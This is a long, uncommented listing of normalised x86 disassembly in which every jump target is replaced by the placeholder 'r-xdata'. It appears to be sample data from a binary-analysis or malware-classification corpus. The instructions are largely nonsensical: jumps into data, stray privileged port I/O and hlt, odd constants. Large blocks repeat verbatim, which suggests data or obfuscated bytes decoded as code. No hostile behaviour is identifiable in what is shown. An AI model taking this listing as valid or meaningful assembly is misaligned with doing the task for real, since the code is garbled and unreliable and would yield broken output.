jpo r-xdata
xchg ebx eax
mov ebx 0xebb8b225
jmp r-xdata
mov edi 0xfb7b1377
jpo r-xdata
xor [ esi + 0x7b ] ebx
jpo r-xdata
jpo r-xdata
jge r-xdata
push ds
xchg [ esp + eax * 4 + 0x3ebcebeb ] eax
mov bl 0x9
push ds
sub eax 0xb73ebc36
or al 0x1a
sub [ edi + ecx + 0x2d84635f ] al
setb [ edi - 0x14848488 ]
[ eax ] 0xffffffb2
mov eax 0xebebebeb
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
dec ebp
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
sub eax 0x78af920f
cvtdq2ps xmm6 [ ebx ]
or eax 0x84a68692
jmp r-xdata
fidivr [ ecx + 0x7b ]
jpo r-xdata
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc esi [ esi + 0x2c1e796a ]
cmp eax 0x79da935b
jpo r-xdata
mov esp 0x2d15c73e
xchg ebx eax
or [ esi ] ebx
mov esp 0x1e23cf3e
adc eax 0xc33ebc2d
and ebx [ ss : esi ]
mov esp 0x1a0cb73e
jmp r-xdata
jmp r-xdata
jpo r-xdata
test [ edx + 0x6 ] al
adc [ edx + 0x7b7b4bbf ] 0xffffff93
jpo r-xdata
mov esp 0xeb7b7b4a
sub [ 0x7bc7cbf0 ] ch
jpo r-xdata
jpo r-xdata
jmp r-xdata
inc ecx
jno r-xdata
xchg edx eax
jpo r-xdata
xchg edx eax
xchg ebx eax
cmp esi [ edi + 0x7b ]
jpo r-xdata
test [ edx + eax * 2 - 0x406d7cfa ] al
dec ebx
jpo r-xdata
jmp r-xdata
sub al 0xfe
lea edx [ edx - 0x7b7b6c51 ]
jmp r-xdata
adc eax [ ebx - 0x6dcdbb49 ]
imul edx [ ecx + 0x7b ] 0x8306f27b
test ch ch
idiv [ ebx + 0x7b ]
imul edi esi 0xffffffbb
je r-xdata
dec eax
mov al [ 0xffffffff928dfe2c ]
scasd [ edi ]
xchg ebx eax
test [ ebx + ebp * 8 - 0xd141415 ] al
mov [ es : 0x7b6a7592 ] eax
jpo r-xdata
adc eax 0x7b568892
jpo r-xdata
inc ecx
and edx [ ecx ]
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
jpo r-xdata
test [ ebx + edi - 0x400109d5 ] al
xchg [ esp + eax * 4 + 0x527d922b ] eax
jpo r-xdata
jpo r-xdata
test [ edi ] cl
pop edi
arpl [ ebp + ebp + 0x78af920f ] ax
jmp r-xdata
test bl ch
xchg ebx eax
r-xdata
mov esp 0x814a33e
adc al 0x1d
mov esp 0x5b0fa73e
in al dx
0x71928484 0x7b7d
jpo r-xdata
xchg ebx eax
xor ecx [ 0xffffffff84a68692 ]
sbb eax 0xfa73ebc
pop ebx
jmp r-xdata
jpo r-xdata
mov ebx 0x8731f274
sti
jpo r-xdata
xchg [ edx + 0x7b7b5970 ] edx
jmp r-xdata
[ esi ]
bound edi [ ebx + 0x7b ]
clc
mov ebx 0x6b529279
jpo r-xdata
and [ 0x23a73ef2 ] ebx
jmp r-xdata
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
imul edi [ ebx + 0x7b ] 0xffffffeb
jpo r-xdata
hlt
and al 0x11
add esp [ ecx ]
adc [ edx + edx * 4 ] edi
jmp r-xdata
jpo r-xdata
push edx
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
adc [ ecx ] esp
sub eax 0x7d933636
pop ebp
xchg ebx eax
mov ebx 0x3b848492
sub esi esi
or al 0x7b
jpo r-xdata
adc [ edi ] edi
jmp r-xdata
push esi
jpo r-xdata
jae r-xdata
jmp r-xdata
jmp r-xdata
test ah cl
cmpsd [ esi ] [ edi ]
jpo r-xdata
dec eax
test [ edx - 0x7b7b6d3a ] dl
jmp r-xdata
aas
jpo r-xdata
sbb eax 0x23a73ef2
test [ esi + esi * 8 - 0x7b794c0a ] al
test dh dh
jpo r-xdata
test [ ebx + ebp * 8 + 0x6af1ebeb ] al
xchg edx eax
loopne r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax
in al 0x9a
test [ ebx + ebp * 8 - 0x14141415 ] al
sub eax 0x3928bf0
jg r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
je r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
jmp r-xdata
sbb eax 0xf0d53ef2
mov ch 0xf6
mov bh 0x1d
push cs
xlat
jmp r-xdata
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
sub eax 0xeb8484a3
jmp r-xdata
mov edi 0x79112877
test [ 0x7dc99277 ] ch
test bl ch
jmp r-xdata
jae r-xdata
jmp r-xdata
jpo r-xdata
mov al [ 0x2126f21d ]
xchg edx eax
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
xchg ebx eax
hlt
jpo r-xdata
je r-xdata
or edx [ edx + 0x7b7b6b5d ]
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
jmp r-xdata
mov ebx 0x84a45592
test bl ch
dec eax
mov ebx 0xebebebb8
jmp r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jmp r-xdata
sub edx [ ebx + 0x7b7b5406 ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
lahf
jmp r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
and ecx [ eax - 0x60 ]
sbb eax 0x922126f2
jmp r-xdata
jmp r-xdata
xchg edx eax
pop es
jg r-xdata
clc
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
adc al 0x23
jmp r-xdata
jpo r-xdata
sub eax 0x7dc99277
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] ecx
test bl ch
jmp r-xdata
push esp
jpo r-xdata
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

stosd [ edi ]
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
and dl [ edx - 0x7b7b62ab ]
jmp r-xdata
pop edx
sbb [ ebx + edi * 2 + 0x7b ] edx
mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jae r-xdata
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
jpo r-xdata
lahf
sub eax 0x63b29236
jmp r-xdata
xchg edx eax
int3
sub_4796bd
xchg edx eax
test [ eax - 0x6dd17b7c ] 0x49
cmpsb [ esi ] [ edi ]
test [ esp + esi * 2 + 0x7b5436f8 ] al
jmp r-xdata
push ecx
0xebeb8484 0xcc84
mov bh 0x7b
jpo r-xdata
je r-xdata
xchg edx eax
test al 0x5c
jpo r-xdata
jle r-xdata
xchg ebx eax
cld
js r-xdata
jmp r-xdata
test [ ebx + ebp + 0x2b2c8428 ] al
test [ edx + edx * 4 - 0x7b7b6b19 ] al
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc eax
mov eax 0x7b73e192
jpo r-xdata
sub [ eax ] ch
jmp r-xdata
retn
mov ebx 0x8731f274
xor [ edi + 0x69923244 ] 0x51
jpo r-xdata
lds esi [ eax ]
test [ esp + ecx * 8 + 0x7b7b7bbf ] 0x84871e92
test bl ch
jmp r-xdata
and dh dh
mov [ ss : 0xffffffff923b112a ] eax
idiv dh
add eax [ esi + 0x282b8484 ]
test [ ebx + ebp ] ch
mov esp 0x814a33e
adc al 0x1d
mov esp 0x5b0fa73e
xchg ebx eax
jmp r-xdata
push es
add [ ebp + ebp * 8 + 0x7b7b7bf7 ] 0xfffffffe
jmp r-xdata
xchg ebx eax
mov ebx 0xebb8b225
jmp r-xdata
jmp r-xdata
jpo r-xdata
test [ edx + eax * 2 - 0x406d7cfa ] al
dec ebx
jpo r-xdata
jmp r-xdata
sub eax 0x7bc7cbf0
cmp ebp [ ebx ]
idiv dh
mov edi 0x2b848487
xchg edx eax
jge r-xdata
xor [ esi + 0x7b ] ebx
jpo r-xdata
jpo r-xdata
xor ebx [ edi + 0x7b ]
jpo r-xdata
and ah [ edx ]
div [ esi ]
mov [ 0xffffffff923b112a ] eax
xchg edx eax
xchg ebx eax
cmp esi [ edi + 0x7b ]
jpo r-xdata
xor ecx [ 0xffffffff84a68692 ]
sbb eax 0xfa73ebc
pop ebx
imul edi esi 0xffffffbb
je r-xdata
dec eax
mov al [ 0xffffffff928dfe2c ]
scasd [ edi ]
xchg ebx eax
test [ ebx + ebp * 8 - 0xd141415 ] al
mov [ es : 0x7b6a7592 ] eax
jpo r-xdata
jge r-xdata
mov bh 0xc
sbb cl [ ecx ]
push ds
mov esp 0x1e23cf3e
adc eax 0xc33ebc2d
and ebx [ ss : esi ]
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
dec ebp
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
test bl ch
xchg ebx eax
r-xdata
cvtdq2ps xmm6 [ ebx ]
or eax 0x84a68692
jmp r-xdata
sti
jpo r-xdata
xchg [ edx + 0x7b7b5970 ] edx
jmp r-xdata
[ esi ]
bound edi [ ebx + 0x7b ]
clc
mov ebx 0x6b529279
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
fidivr [ ecx + 0x7b ]
jpo r-xdata
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc esi [ esi + 0x2c1e796a ]
cmp eax 0x79da935b
jpo r-xdata
mov esp 0x2d15c73e
xchg ebx eax
jmp r-xdata
jpo r-xdata
hlt
and al 0x11
add esp [ ecx ]
adc [ edx + edx * 4 ] edi
jmp r-xdata
sub eax 0x7d933636
pop ebp
xchg ebx eax
mov ebx 0x3b848492
sub esi esi
in al dx
0x71928484 0x7b7d
jpo r-xdata
test [ edx + 0x6 ] al
adc [ edx + 0x7b7b4bbf ] 0xffffff93
jpo r-xdata
jpo r-xdata
mov esp 0xeb7b7b4a
sub [ 0x7bc7cbf0 ] ch
jpo r-xdata
jmp r-xdata
inc ecx
jno r-xdata
xchg edx eax
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
or al 0x7b
jpo r-xdata
sub al 0xfe
lea edx [ edx - 0x7b7b6c51 ]
jmp r-xdata
adc eax [ ebx - 0x6dcdbb49 ]
imul edx [ ecx + 0x7b ] 0x8306f27b
test ch ch
idiv [ ebx + 0x7b ]
adc eax 0x7b568892
jpo r-xdata
inc ecx
and edx [ ecx ]
jpo r-xdata
and [ 0x23a73ef2 ] ebx
adc [ edi ] edi
jmp r-xdata
jmp r-xdata
jpo r-xdata
je r-xdata
jmp r-xdata
push esi
jpo r-xdata
jae r-xdata
imul edi [ ebx + 0x7b ] 0xffffffeb
jpo r-xdata
push edx
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
adc [ ecx ] esp
jmp r-xdata
jmp r-xdata
test ah cl
cmpsd [ esi ] [ edi ]
jpo r-xdata
dec eax
test [ edx - 0x7b7b6d3a ] dl
jmp r-xdata
aas
jpo r-xdata
sbb eax 0x23a73ef2
test [ esi + esi * 8 - 0x7b794c0a ] al
test dh dh
jpo r-xdata
test [ ebx + ebp * 8 + 0x6af1ebeb ] al
xchg edx eax
loopne r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax
in al 0x9a
test [ ebx + ebp * 8 - 0x14141415 ] al
sub eax 0x3928bf0
jg r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
je r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
jmp r-xdata
sbb eax 0xf0d53ef2
mov ch 0xf6
mov bh 0x1d
push cs
xlat
jmp r-xdata
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
sub eax 0xeb8484a3
jmp r-xdata
mov edi 0x79112877
test [ 0x7dc99277 ] ch
test bl ch
jmp r-xdata
jae r-xdata
jmp r-xdata
jpo r-xdata
mov al [ 0x2126f21d ]
xchg edx eax
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
xchg ebx eax
hlt
jpo r-xdata
je r-xdata
or edx [ edx + 0x7b7b6b5d ]
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
jmp r-xdata
mov ebx 0x84a45592
test bl ch
dec eax
mov ebx 0xebebebb8
jmp r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jmp r-xdata
sub edx [ ebx + 0x7b7b5406 ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
lahf
jmp r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
and ecx [ eax - 0x60 ]
sbb eax 0x922126f2
jmp r-xdata
jmp r-xdata
xchg edx eax
pop es
jg r-xdata
clc
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
adc al 0x23
jmp r-xdata
jpo r-xdata
sub eax 0x7dc99277
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] ecx
test bl ch
jmp r-xdata
push esp
jpo r-xdata
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

stosd [ edi ]
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
and dl [ edx - 0x7b7b62ab ]
jmp r-xdata
pop edx
sbb [ ebx + edi * 2 + 0x7b ] edx
mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jae r-xdata
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
jpo r-xdata
lahf
sub eax 0x63b29236
jmp r-xdata
xchg edx eax
int3
sub_4796f8
pop ds
xchg edx eax
xchg esi eax
xchg ebp eax
test [ ebx + ebp * 8 + 0xf84292c ] al
pop edi
arpl [ ebx + 0x7b7b486d ] dx
clc
mov edi 0xfb7b1377
jpo r-xdata
push ds
xchg [ esp + eax * 4 + 0x3ebcebeb ] eax
mov bl 0x9
push ds
sub eax 0xb73ebc36
or al 0x1a
sub [ edi + ecx + 0x2d84635f ] al
setb [ edi - 0x14848488 ]
[ eax ] 0xffffffb2
mov eax 0xebebebeb
jmp r-xdata
xor [ esi + 0x7b ] ebx
jpo r-xdata
jpo r-xdata
sub eax 0x78af920f
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
dec ebp
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
or [ esi ] ebx
mov esp 0x1e23cf3e
adc eax 0xc33ebc2d
and ebx [ ss : esi ]
mov esp 0x1a0cb73e
jmp r-xdata
cvtdq2ps xmm6 [ ebx ]
or eax 0x84a68692
jmp r-xdata
fidivr [ ecx + 0x7b ]
jpo r-xdata
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc esi [ esi + 0x2c1e796a ]
cmp eax 0x79da935b
jpo r-xdata
mov esp 0x2d15c73e
xchg ebx eax
jge r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ edx + 0x6 ] al
adc [ edx + 0x7b7b4bbf ] 0xffffff93
jpo r-xdata
mov esp 0xeb7b7b4a
sub [ 0x7bc7cbf0 ] ch
jpo r-xdata
jpo r-xdata
jmp r-xdata
inc ecx
jno r-xdata
xchg edx eax
test [ ebx + edi - 0x400109d5 ] al
xchg [ esp + eax * 4 + 0x527d922b ] eax
jpo r-xdata
jpo r-xdata
test [ edi ] cl
pop edi
arpl [ ebp + ebp + 0x78af920f ] ax
xchg edx eax
xchg ebx eax
cmp esi [ edi + 0x7b ]
jpo r-xdata
test [ edx + eax * 2 - 0x406d7cfa ] al
dec ebx
jpo r-xdata
jmp r-xdata
sub al 0xfe
lea edx [ edx - 0x7b7b6c51 ]
jmp r-xdata
adc eax [ ebx - 0x6dcdbb49 ]
imul edx [ ecx + 0x7b ] 0x8306f27b
test ch ch
idiv [ ebx + 0x7b ]
imul edi esi 0xffffffbb
je r-xdata
dec eax
mov al [ 0xffffffff928dfe2c ]
scasd [ edi ]
xchg ebx eax
test [ ebx + ebp * 8 - 0xd141415 ] al
mov [ es : 0x7b6a7592 ] eax
jpo r-xdata
adc eax 0x7b568892
jpo r-xdata
inc ecx
and edx [ ecx ]
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
xchg ebx eax
r-xdata
mov esp 0x814a33e
adc al 0x1d
mov esp 0x5b0fa73e
in al dx
0x71928484 0x7b7d
jpo r-xdata
xchg ebx eax
xor ecx [ 0xffffffff84a68692 ]
sbb eax 0xfa73ebc
pop ebx
jmp r-xdata
jpo r-xdata
mov ebx 0x8731f274
sti
jpo r-xdata
xchg [ edx + 0x7b7b5970 ] edx
jmp r-xdata
[ esi ]
bound edi [ ebx + 0x7b ]
clc
mov ebx 0x6b529279
jpo r-xdata
and [ 0x23a73ef2 ] ebx
jmp r-xdata
je r-xdata
jmp r-xdata
sub eax 0x7d933636
pop ebp
xchg ebx eax
mov ebx 0x3b848492
sub esi esi
imul edi [ ebx + 0x7b ] 0xffffffeb
jpo r-xdata
hlt
and al 0x11
add esp [ ecx ]
adc [ edx + edx * 4 ] edi
jmp r-xdata
jpo r-xdata
push edx
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
adc [ ecx ] esp
or al 0x7b
jpo r-xdata
adc [ edi ] edi
jmp r-xdata
push esi
jpo r-xdata
jae r-xdata
jmp r-xdata
jmp r-xdata
test ah cl
cmpsd [ esi ] [ edi ]
jpo r-xdata
dec eax
test [ edx - 0x7b7b6d3a ] dl
jmp r-xdata
aas
jpo r-xdata
sbb eax 0x23a73ef2
test [ esi + esi * 8 - 0x7b794c0a ] al
test dh dh
jpo r-xdata
test [ ebx + ebp * 8 + 0x6af1ebeb ] al
xchg edx eax
loopne r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax
in al 0x9a
test [ ebx + ebp * 8 - 0x14141415 ] al
sub eax 0x3928bf0
jg r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
je r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
jmp r-xdata
sbb eax 0xf0d53ef2
mov ch 0xf6
mov bh 0x1d
push cs
xlat
jmp r-xdata
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
sub eax 0xeb8484a3
jmp r-xdata
mov edi 0x79112877
test [ 0x7dc99277 ] ch
test bl ch
jmp r-xdata
jae r-xdata
jmp r-xdata
jpo r-xdata
mov al [ 0x2126f21d ]
xchg edx eax
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
xchg ebx eax
hlt
jpo r-xdata
je r-xdata
or edx [ edx + 0x7b7b6b5d ]
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
jmp r-xdata
mov ebx 0x84a45592
test bl ch
dec eax
mov ebx 0xebebebb8
jmp r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jmp r-xdata
sub edx [ ebx + 0x7b7b5406 ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
lahf
jmp r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
and ecx [ eax - 0x60 ]
sbb eax 0x922126f2
jmp r-xdata
jmp r-xdata
xchg edx eax
pop es
jg r-xdata
clc
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
adc al 0x23
jmp r-xdata
jpo r-xdata
sub eax 0x7dc99277
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] ecx
test bl ch
jmp r-xdata
push esp
jpo r-xdata
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

stosd [ edi ]
add [ esp + eax * 4 - 0x14141415 ] 0xeb
jmp r-xdata
je r-xdata
and dl [ edx - 0x7b7b62ab ]
jmp r-xdata
pop edx
sbb [ ebx + edi * 2 + 0x7b ] edx
mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jae r-xdata
xchg edx eax
pop ebp
imul edi [ ebx + 0x7b ] 0xffffffeb
jmp r-xdata
out dx al
cmpsd [ esi ] [ edi ]
test [ ecx + edx + 0xb112314 ] al
jpo r-xdata
lahf
sub eax 0x63b29236
jmp r-xdata
xchg edx eax
int3
sub_479753
jmp r-xdata
jmp r-xdata
mov bl 0x9
push ds
sub eax 0xb73ebc36
or al 0x1a
or [ esi ] ebx
mov esp 0x1e23cf3e
adc eax 0xc33ebc2d
and ebx [ ss : esi ]
xor [ esi + 0x7b ] ebx
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
dec ebp
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
cvtdq2ps xmm6 [ ebx ]
or eax 0x84a68692
jmp r-xdata
fidivr [ ecx + 0x7b ]
jpo r-xdata
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc esi [ esi + 0x2c1e796a ]
cmp eax 0x79da935b
jpo r-xdata
mov esp 0x2d15c73e
xchg ebx eax
jge r-xdata
jmp r-xdata
jpo r-xdata
test [ edx + 0x6 ] al
adc [ edx + 0x7b7b4bbf ] 0xffffff93
jpo r-xdata
mov esp 0xeb7b7b4a
sub [ 0x7bc7cbf0 ] ch
jpo r-xdata
jpo r-xdata
jmp r-xdata
inc ecx
jno r-xdata
xchg edx eax
xchg edx eax
xchg ebx eax
cmp esi [ edi + 0x7b ]
jpo r-xdata
test [ edx + eax * 2 - 0x406d7cfa ] al
dec ebx
jpo r-xdata
jmp r-xdata
sub al 0xfe
lea edx [ edx - 0x7b7b6c51 ]
jmp r-xdata
adc eax [ ebx - 0x6dcdbb49 ]
imul edx [ ecx + 0x7b ] 0x8306f27b
test ch ch
idiv [ ebx + 0x7b ]
imul edi esi 0xffffffbb
je r-xdata
dec eax
mov al [ 0xffffffff928dfe2c ]
scasd [ edi ]
xchg ebx eax
test [ ebx + ebp * 8 - 0xd141415 ] al
mov [ es : 0x7b6a7592 ] eax
jpo r-xdata
adc eax 0x7b568892
jpo r-xdata
inc ecx
and edx [ ecx ]
[ esi ] [ edi ]
and edx [ ecx ]
adc al 0x1d
[ edi ] [ esi ]
and edx [ ecx ]
jpo r-xdata
jmp r-xdata
test bl ch
xchg ebx eax
r-xdata
mov esp 0x814a33e
adc al 0x1d
mov esp 0x5b0fa73e
in al dx
0x71928484 0x7b7d
jpo r-xdata
xchg ebx eax
xor ecx [ 0xffffffff84a68692 ]
sbb eax 0xfa73ebc
pop ebx
jmp r-xdata
jpo r-xdata
mov ebx 0x8731f274
sti
jpo r-xdata
xchg [ edx + 0x7b7b5970 ] edx
jmp r-xdata
[ esi ]
bound edi [ ebx + 0x7b ]
clc
mov ebx 0x6b529279
jpo r-xdata
and [ 0x23a73ef2 ] ebx
jmp r-xdata
je r-xdata
jmp r-xdata
imul edi [ ebx + 0x7b ] 0xffffffeb
jpo r-xdata
hlt
and al 0x11
add esp [ ecx ]
adc [ edx + edx * 4 ] edi
jmp r-xdata
jpo r-xdata
push edx
mov al [ esp + eax * 4 + 0x6e5f922c ]
adc [ ebx + 0x23a53ef2 ] edx
adc [ 0x7b568892 ] edx
adc [ ecx ] esp
or al 0x7b
jpo r-xdata
adc [ edi ] edi
jmp r-xdata
push esi
jpo r-xdata
jae r-xdata
jmp r-xdata
jmp r-xdata
test ah cl
cmpsd [ esi ] [ edi ]
jpo r-xdata
dec eax
test [ edx - 0x7b7b6d3a ] dl
jmp r-xdata
aas
jpo r-xdata
sbb eax 0x23a73ef2
test [ esi + esi * 8 - 0x7b794c0a ] al
test dh dh
jpo r-xdata
test [ ebx + ebp * 8 + 0x6af1ebeb ] al
xchg edx eax
loopne r-xdata
jmp r-xdata
test bl ch
jmp r-xdata
xchg edx eax
in al 0x9a
test [ ebx + ebp * 8 - 0x14141415 ] al
sub eax 0x3928bf0
jg r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
je r-xdata
test [ edx ] ah
xchg edx eax
push ebp
popfd
jmp r-xdata
sbb eax 0xf0d53ef2
mov ch 0xf6
mov bh 0x1d
push cs
xlat
jmp r-xdata
test [ ebx + ebp * 8 + 0x68ed013 ] al
inc edi
sub [ edx - 0x7b7b6548 ] dl
jmp r-xdata
sub eax 0xeb8484a3
jmp r-xdata
mov edi 0x79112877
test [ 0x7dc99277 ] ch
test bl ch
jmp r-xdata
jae r-xdata
jmp r-xdata
jpo r-xdata
mov al [ 0x2126f21d ]
xchg edx eax
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
xchg ebx eax
hlt
jpo r-xdata
je r-xdata
or edx [ edx + 0x7b7b6b5d ]
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
jmp r-xdata
mov ebx 0x84a45592
test bl ch
dec eax
mov ebx 0xebebebb8
jmp r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
jmp r-xdata
sub edx [ ebx + 0x7b7b5406 ]
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
lahf
jmp r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
and ecx [ eax - 0x60 ]
sbb eax 0x922126f2
jmp r-xdata
jmp r-xdata
xchg edx eax
pop es
jg r-xdata
clc
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
adc al 0x23
jmp r-xdata
jpo r-xdata
sub eax 0x7dc99277
jmp r-xdata
jmp r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx ] ecx
test bl ch
jmp r-xdata
push esp
jpo r-xdata
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

stosd [ edi ]
